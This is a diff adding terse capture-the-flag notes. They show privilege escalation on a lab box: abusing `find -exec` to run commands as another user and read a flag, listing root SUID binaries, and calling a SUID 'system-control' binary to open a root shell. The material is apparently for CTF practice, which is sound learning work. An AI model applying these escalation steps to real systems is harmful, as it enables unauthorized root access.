@@ -1,0 +1,21 @@
+find test -exec whoami \;
+find gives igor exec privileges so
+find test -exec cat /home/igor/flag1.txt \;
+will give the first flag
+
+Using
+find / -user root -perm -4000 -exec ls -ldb {} \; > test
+gives all files with uid set bits for root, outputing to test removes the permission denied parts
+
+saw this:
+-rwsrwxr-x 1 root root 8880 Dec  7 21:17 /usr/bin/system-control
+an awful lot of privileges
+
+Used:
+find test  -exec /usr/bin/system-control \;
+then recieved:
+===== System Control Binary =====
+
+Enter system command: bash
+once entered opened a shell with root privileges
+simply cat the flag file
